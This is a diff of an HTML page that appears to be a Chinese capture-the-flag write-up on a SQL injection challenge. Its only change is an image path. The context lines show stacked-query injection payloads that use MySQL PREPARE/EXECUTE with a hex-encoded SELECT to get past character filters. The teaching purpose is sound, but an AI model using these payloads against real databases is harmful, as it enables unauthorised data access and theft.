@@ -53,7 +53,7 @@
 <p>1’;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;– -</p>
 <p>同时，我们也可以先定义一个变量并将sql语句初始化，然后调用</p>
 <p>1’;Set @ryxer &#x3D; 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @ryxer;EXECUTE hacker;– -</p>
-<p><img src="/images/Web%E9%9A%8F%E4%BE%BF%E6%B3%A810-17804800035843.png" alt="Web随便注10"></p>
+<p><img src="/images/Web%E9%9A%8F%E4%BE%BF%E6%B3%A810.png" alt="Web随便注10"></p>
 <p>预编译相当于定一个语句相同，参数不通的<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=209402995&content_type=Article&match_order=1&q=Mysql&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NzE3NDU5NDUsInEiOiJNeXNxbCIsInpoaWRhX3NvdXJjZSI6ImVudGl0eSIsImNvbnRlbnRfaWQiOjIwOTQwMjk5NSwiY29udGVudF90eXBlIjoiQXJ0aWNsZSIsIm1hdGNoX29yZGVyIjoxLCJ6ZF90b2tlbiI6bnVsbH0.ZdgyWOcW_j0KzGUwO5iqxF-YIVA8wAcjwIbL6Mr0VRk&zhida_source=entity">Mysql</a>模板，我们可以通过预编译的方式，绕过特定的字符过滤</p>
 <p>格式：</p>
 <p>PREPARE 名称 FROM     Sql语句 ? ;<br> SET @x&#x3D;xx;<br> EXECUTE 名称 USING @x;</p>
